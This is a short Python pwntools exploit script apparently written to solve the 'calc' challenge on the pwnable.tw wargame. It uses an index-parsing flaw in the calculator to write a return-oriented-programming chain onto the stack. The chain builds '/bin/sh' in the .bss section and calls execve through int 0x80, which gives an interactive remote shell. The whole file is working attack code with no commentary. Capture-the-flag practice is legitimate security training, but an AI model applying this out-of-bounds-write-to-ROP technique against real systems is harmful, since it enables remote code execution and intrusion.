from pwn import *
#context.log_level = "debug"

#HOST = "localhost"
HOST = "chall.pwnable.tw"
#PORT = 4444
PORT = 10100

s = remote(HOST, PORT)

elf = ELF("./calc")
#libc = ELF("./")
pause()

AAAA = 0x41414141

xor_eax = 0x0808c980

pop_eax = 0x0805c34b
pop_edx = 0x080701aa
pop_ebx = 0x0807cb40
pop_ecx_ebx = 0x80701d1

eax_to_edx = 0x08090976

int_0x80 = 0x08049a21

_bin = 0x6e69622f
__sh = 0x0068732f

_bss = 0x080EE360

shell = [pop_edx, _bss, pop_eax, _bin, eax_to_edx, AAAA, pop_edx, _bss+4, pop_eax, __sh, eax_to_edx, AAAA, pop_edx, _bss+8, xor_eax, eax_to_edx, AAAA, pop_ecx_ebx, _bss+8, _bss, pop_eax, 0xb, pop_ebx, _bss, int_0x80]

def insert(index, data):
	payload = "+" + str(index) + "+"
	payload += str(data)
	s.sendline(payload)
	s.recv()

for i in range(len(shell)):
	index = 360 + (len(shell) - i - 1)
	insert(index, shell[len(shell) - i - 1])

s.interactive()